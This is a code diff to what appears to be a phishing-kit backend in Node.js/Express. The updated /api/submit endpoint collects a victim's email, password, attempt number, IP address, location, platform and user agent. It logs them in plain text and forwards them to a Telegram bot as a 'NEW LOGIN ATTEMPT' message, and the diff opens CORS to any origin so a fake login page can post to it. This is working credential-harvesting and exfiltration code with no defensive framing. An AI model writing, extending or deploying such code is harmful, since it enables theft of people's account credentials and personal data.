@@ -13,11 +13,15 @@ const CONFIG = {
   }
 };
 
-// Basic middleware - SIMPLIFIED
-app.use(cors());
+// Middleware - IMPORTANT: Allow frontend requests
+app.use(cors({
+  origin: '*', // Or your frontend URL like 'https://your-frontend.vercel.app'
+  methods: ['GET', 'POST'],
+  credentials: false
+}));
 app.use(express.json());
 
-// Health check endpoint - SIMPLE VERSION
+// Health check endpoint
 app.get('/api/health', (req, res) => {
   console.log('✅ Health check passed');
   res.json({ 
@@ -27,15 +31,13 @@ app.get('/api/health', (req, res) => {
   });
 });
 
-// Test endpoint - SIMPLE VERSION
+// Test endpoint
 app.get('/api/test-telegram', async (req, res) => {
   console.log('🧪 Testing Telegram connection...');
   
   try {
-    // Simple test without axios
     const testMessage = `🤖 BOT TEST\n\nServer is working! Time: ${new Date().toLocaleString()}`;
     
-    // Using fetch instead of axios for compatibility
     const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
     
     const response = await fetch(telegramUrl, {
@@ -73,62 +75,65 @@ app.get('/api/test-telegram', async (req, res) => {
   }
 });
 
-// Main endpoint - SIMPLIFIED
+// Main endpoint - UPDATED for frontend integration
 app.post('/api/submit', async (req, res) => {
-  console.log('📨 Received data submission');
+  console.log('📨 Received data submission from frontend');
   
   try {
     const { 
       email,
-      firstpasswordused,
-      secondpasswordused,
-      country = 'Unknown',
-      city = 'Unknown',
-      device = {}
+      password,
+      attempt,
+      ip,
+      location,
+      country,
+      city,
+      continent,
+      language,
+      platform,
+      userAgent
     } = req.body;
 
     // Basic validation
-    if (!email) {
+    if (!email || !password) {
       return res.status(400).json({
         success: false,
-        error: 'Email is required'
-      });
-    }
-
-    const passwordUsed = firstpasswordused || secondpasswordused;
-    const attemptType = firstpasswordused ? 'First' : 'Second';
-
-    if (!passwordUsed) {
-      return res.status(400).json({
-        success: false,
-        error: 'Password is required'
+        error: 'Email and password are required'
       });
     }
 
     console.log(`📧 Email: ${email}`);
-    console.log(`🔑 Password: ${passwordUsed}`);
-    console.log(`🎯 Attempt: ${attemptType}`);
+    console.log(`🔑 Password: ${password}`);
+    console.log(`🎯 Attempt: ${attempt}`);
 
-    // Try to send to Telegram if configured
+    // Send to Telegram if configured
+    let telegramStatus = 'not_configured';
+    
     if (CONFIG.TELEGRAM.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
       try {
         const telegramMessage = `
 🔐 NEW LOGIN ATTEMPT
 
 📧 Email: ${email}
-🔑 Password: ${passwordUsed}
-🎯 Attempt: ${attemptType}
+🔑 Password: ${password}
+🎯 Attempt: ${attempt}
 
-🌍 Location: ${city}, ${country}
-💻 Platform: ${device.platform || 'Unknown'}
-🌐 Language: ${device.language || 'Unknown'}
+🌍 Location: ${location}
+📍 Country: ${country}
+🏙️ City: ${city}
+🌐 Continent: ${continent}
+
+💻 Platform: ${platform}
+🗣️ Language: ${language}
+📱 User Agent: ${userAgent?.substring(0, 50)}...
+🌐 IP: ${ip}
 
 ⏰ Time: ${new Date().toLocaleString()}
         `;
 
         const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
         
-        await fetch(telegramUrl, {
+        const telegramResponse = await fetch(telegramUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -137,10 +142,18 @@ app.post('/api/submit', async (req, res) => {
           })
         });
 
-        console.log('✅ Data sent to Telegram');
+        const telegramResult = await telegramResponse.json();
+        
+        if (telegramResult.ok) {
+          console.log('✅ Data sent to Telegram');
+          telegramStatus = 'sent';
+        } else {
+          throw new Error(telegramResult.description);
+        }
         
       } catch (telegramError) {
-        console.log('⚠️ Telegram failed, but data was received');
+        console.log('⚠️ Telegram failed:', telegramError.message);
+        telegramStatus = 'failed';
       }
     } else {
       console.log('ℹ️ Telegram not configured - data received but not sent');
@@ -151,7 +164,12 @@ app.post('/api/submit', async (req, res) => {
       success: true,
       message: 'Data received successfully',
       timestamp: new Date().toISOString(),
-      telegram: CONFIG.TELEGRAM.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' ? 'sent' : 'not_configured'
+      telegram: telegramStatus,
+      data_received: {
+        email: email,
+        attempt: attempt,
+        location: location
+      }
     });
 
   } catch (error) {
@@ -178,6 +196,6 @@ app.use('*', (req, res) => {
 // Start server
 app.listen(CONFIG.PORT, () => {
   console.log(`🎉 Server running on port ${CONFIG.PORT}`);
-  console.log(`📍 Health: https://server-gfhv.onrender.com/api/health`);
-  console.log('💡 Next: Configure Telegram BOT_TOKEN and CHAT_ID');
+  console.log(`📍 Health: http://localhost:${CONFIG.PORT}/api/health`);
+  console.log('💡 Configure Telegram BOT_TOKEN and CHAT_ID to enable Telegram notifications');
 });
